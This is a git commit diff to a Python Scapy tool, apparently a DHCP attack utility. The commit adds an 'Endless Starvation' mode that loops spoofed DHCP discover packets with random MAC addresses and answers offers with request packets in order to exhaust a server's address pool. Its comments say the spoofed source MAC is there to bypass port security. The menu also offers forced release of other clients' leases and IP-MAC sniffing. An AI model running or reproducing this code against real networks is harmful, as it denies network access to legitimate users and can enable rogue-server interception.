a48d6213e70842bc2d1e44569ce0d82fddce5884
Andrew <32744977+kupori@users.noreply.github.com>
2020-06-22 16:26:21 +0800

    Added Endless Starvation
    Endless Starvation constantly loops all discover packets until e is pressed, does not exit properly. Need to close terminal

--- starvenia.py
+++ starvenia.py
@@ -5,6 +5,7 @@ import socket
 import threading
 from time import sleep
 import netifaces
+import keyboard
 
 # Create global variables 
 spoofed_chaddr_list = []
@@ -33,6 +34,7 @@ class Starvenia(threading.Thread):
 
     # Send discover packets 
     def send_discover(self):
+        print ""
         print "Starting Starvation"
         print ""
         for i in range(255):
@@ -97,6 +99,91 @@ class Starvenia(threading.Thread):
         starve_menu()
 
 
+class Starvenia2(threading.Thread):
+
+    def __init__(self):
+        # Utilize threading to run sniff and send_discover function at the same time 
+        t = threading.Thread(target = self.sniff)
+        t2 = threading.Thread(target = self.send_discover2)
+
+        # Run packet sniffer first before the sending out discover packets
+        t.start()
+        sleep(2) 
+        t2.start()
+    
+    def send_discover2(self):
+        print ""
+        print "Starting Endless Starvation, Press e to exit"
+        print ""
+        packet_number = 0
+        while True:
+            for i in range(255):
+                if keyboard.is_pressed('e'):
+                    print "\nEndless Starvation Ended." + str(packet_number) + " Discover Packets sent"
+                    print "Close terminal to exit properly"
+                    sys.exit()
+                # Generate transaction id
+                transaction_id = random.randint(1, 900000000)
+                # Generate fake CHADDR
+                spoofed_chaddr = str(RandMAC())
+                while spoofed_chaddr in spoofed_chaddr_list:
+                    print "Duplicate SPOOF CHADDR detected, generating a new one"
+                    spoofed_chaddr = str(RandMAC())
+                spoofed_chaddr_list.append(spoofed_chaddr)
+
+                # Create discover packet, specifying source mac to bypass port security
+                discover_packet = Ether(src=source_mac,dst="ff:ff:ff:ff:ff:ff")
+                discover_packet /= IP(src="0.0.0.0", dst="255.255.255.255")
+                discover_packet /= UDP(sport=68, dport=67)
+                discover_packet /= BOOTP(chaddr=spoofed_chaddr, xid=transaction_id)
+                discover_packet /= DHCP(options=[("message-type", "discover"), "end"])
+
+                sendp(discover_packet, iface=interface, verbose=0)
+                packet_number += 1
+                sleep(0.01)
+
+
+    # Sniffed packet analysis + send request packet
+    def packet_analyzer(self, packet):
+
+        # Check for DHCP packet
+        if DHCP in packet:
+
+            # Check for Offer message
+            if packet[DHCP].options[0][1] == 2:
+
+                server_ip = packet[IP].src
+                client_mac = packet[BOOTP].chaddr
+                offered_ip = packet[BOOTP].yiaddr
+                transaction_id = packet[BOOTP].xid
+
+                # Create request packet, specifying source mac to bypass port security
+                request_packet = Ether(src=source_mac,dst="ff:ff:ff:ff:ff:ff")
+                request_packet /= IP(src="0.0.0.0", dst="255.255.255.255")
+                request_packet /= UDP(sport=68, dport=67)
+                request_packet /= BOOTP(chaddr=client_mac, xid=transaction_id)
+                request_packet /= DHCP(options=[("message-type", "request"), ("server_id", server_ip), ("requested_addr", offered_ip), "end"])
+
+                sendp(request_packet, iface=interface, verbose=0)
+
+            # Check for ACK message
+            elif packet[DHCP].options[0][1] == 5:
+                client_mac = packet[BOOTP].chaddr
+                leased_ip = packet[BOOTP].yiaddr
+                leased_ip_list.append(leased_ip)
+                print leased_ip + " has been leased to " + client_mac + ". Total IPs leased: " + str(len(leased_ip_list))
+
+            # Check for NAK message
+            elif packet[DHCP].options[0][1] == 6:
+                print "NAK Received" 
+
+
+    # Sniff function to listen for traffic
+    def sniff(self):
+        sniff(filter="udp and (port 67 or 68)", prn=self.packet_analyzer)
+        starve_menu()
+
+
 # Release Function
 
 class Releaser:
@@ -147,23 +234,26 @@ def starve_menu():
     print "************MAIN MENU**************"
     choice = raw_input("""
     A: DHCP Starvation
-    B: DHCP Release
-    C: SNIFF IP-MAC (UDP + TCP)
-    D: Exit
+    B: DHCP Endless Starvation
+    C: IP-MAC Release
+    D: Sniff IP-MAC (TCP + UDP)
+    E: Exit
 
     Enter your choice: """)
 
     if choice == "A" or choice =="a":
         starve = Starvenia()
-    elif choice == "B" or choice =="b":
+    elif choice=="B" or choice=="b":
+        starve2 = Starvenia2()
+    elif choice == "C" or choice =="c":
         releaseIP = raw_input("Enter IP of client to release: ")
         releaseMAC = raw_input("Enter MAC of client to release: ")
         release = Releaser()
         release.release(server_ip, releaseIP, releaseMAC)
-    elif choice == "C" or choice =="c":
+    elif choice == "D" or choice =="d":
         sniff = Snifferlee()
-    elif choice=="D" or choice=="d":
-        sys.exit
+    elif choice=="E" or choice=="e":
+        sys.exit()
     else:
         print("Invalid input, please try again")
         starve_menu()
